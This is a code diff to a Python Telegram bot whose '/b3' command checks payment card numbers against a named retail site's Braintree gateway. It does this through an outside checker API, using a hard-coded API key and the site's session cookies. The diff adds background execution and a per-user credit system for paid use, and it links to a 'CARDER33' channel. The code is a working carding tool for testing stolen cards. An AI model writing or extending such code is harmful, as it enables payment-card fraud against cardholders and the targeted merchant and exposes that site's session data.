@@ -3735,17 +3735,20 @@ async def run_vbv_check(msg, update, card_data: str):
 
 
 
+import time
 import logging
 import aiohttp
+import asyncio
+from html import escape
 from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+from telegram.constants import ParseMode
+from telegram.ext import ContextTypes
 
-# --- Logging ---
-logging.basicConfig(level=logging.INFO)
+from db import get_user, update_user  # credit system
+
 logger = logging.getLogger(__name__)
 
 API_URL = "https://autob3cook.onrender.com/check?"
-
 API_KEY = "Xcracker911"
 SITE = "https://apluscollectibles.com"
 COOKIES = '''_ga_D1Q49TMJ2C=GS2.1.s1757220818$o7$g0$t1757220818$j60$l0$h0;
@@ -3769,27 +3772,31 @@ sbjs_current_add=fd%3D2025-09-07%2004%3A23%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Faplus
 sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29;
 sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36'''
 
-
-import time
-import logging
-import aiohttp
-from html import escape
-from telegram import Update
-from telegram.constants import ParseMode
-from telegram.ext import ContextTypes
-
-logger = logging.getLogger(__name__)
-
-# Cooldown tracker (per-user)
+# --- Cooldown tracker (per-user) ---
 user_last_command_time = {}
 COOLDOWN_SECONDS = 20
 
+
+# --- Credit System ---
+async def consume_credit(user_id: int) -> bool:
+    try:
+        user_data = await get_user(user_id)
+        if user_data and user_data.get("credits", 0) > 0:
+            new_credits = user_data["credits"] - 1
+            await update_user(user_id, credits=new_credits)
+            return True
+    except Exception as e:
+        logger.warning(f"[consume_credit] Error updating user {user_id}: {e}")
+    return False
+
+
+# --- Command Handler (/b3) ---
 async def b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
     current_time = time.time()
 
-    # --- Cooldown check (non-blocking) ---
+    # --- Cooldown check ---
     if user_id in user_last_command_time:
         elapsed = current_time - user_last_command_time[user_id]
         if elapsed < COOLDOWN_SECONDS:
@@ -3818,8 +3825,8 @@ async def b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
     processing_text = (
         f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
         f"<pre><code>{full_card}</code></pre>\n\n"
-        f"{bullet_link} <b>Gateway ➵ Braintree</b>\n"
-        f"{bullet_link} <b>Status ➵ Checking 🔎...</b>"
+        f"{bullet_link} <b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ 𝑩𝒓𝒂𝒊𝒏𝒕𝒓𝒆𝒆 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝑨𝒖𝒕𝒉</b>\n"
+        f"{bullet_link} <b>𝗦𝘁𝗮𝘁𝘂𝘀 ➵ Checking 🔎...</b>"
     )
     processing_msg = await update.message.reply_text(
         processing_text,
@@ -3827,12 +3834,22 @@ async def b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
         disable_web_page_preview=True
     )
 
+    # 🔥 Run check in background (non-blocking)
+    asyncio.create_task(run_braintree_check(user, cc_input, full_card, processing_msg))
+
+
+# --- Background Task ---
+async def run_braintree_check(user, cc_input, full_card, processing_msg):
+    BULLET_GROUP_LINK = "https://t.me/CARDER33"
+    bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
+
     # --- API request ---
     params = {"key": API_KEY, "site": SITE, "cookies": COOKIES, "cc": cc_input}
     try:
-        async with aiohttp.ClientSession() as session:
+        timeout = aiohttp.ClientTimeout(total=20)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(API_URL, params=params) as resp:
-                data = await resp.json()
+                data = await resp.json(content_type=None)
     except Exception as e:
         await processing_msg.edit_text(
             f"❌ Error: <code>{escape(str(e))}</code>",
@@ -3860,7 +3877,7 @@ async def b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
         country_name = bin_details.get("country") or "Unknown"
         country_flag = bin_details.get("country_emoji", "")
     except Exception as e:
-        logger.warning(f"BIN lookup failed for {bin_number}: {e}")
+        logger.warning(f"BIN lookup failed for {cc[:6]}: {e}")
         brand = issuer = "N/A"
         country_name = "Unknown"
         country_flag = ""
@@ -3872,6 +3889,15 @@ async def b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
     DEVELOPER_NAME = "kคli liຖนxx"
     DEVELOPER_LINK = "https://t.me/Kalinuxxx"
     developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
+
+    # --- Credit consume (only on success) ---
+    credit_ok = await consume_credit(user.id)
+    if not credit_ok:
+        await processing_msg.edit_text(
+            "⚠️ You don’t have enough credits.",
+            parse_mode=ParseMode.HTML
+        )
+        return
 
     # --- Final formatted message ---
     final_msg = (
@@ -3897,10 +3923,6 @@ async def b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     except Exception as e:
         logger.exception("Error editing final message")
-        await update.message.reply_text(
-            f"❌ Error: <code>{escape(str(e))}</code>",
-            parse_mode=ParseMode.HTML
-        )
 
 
 
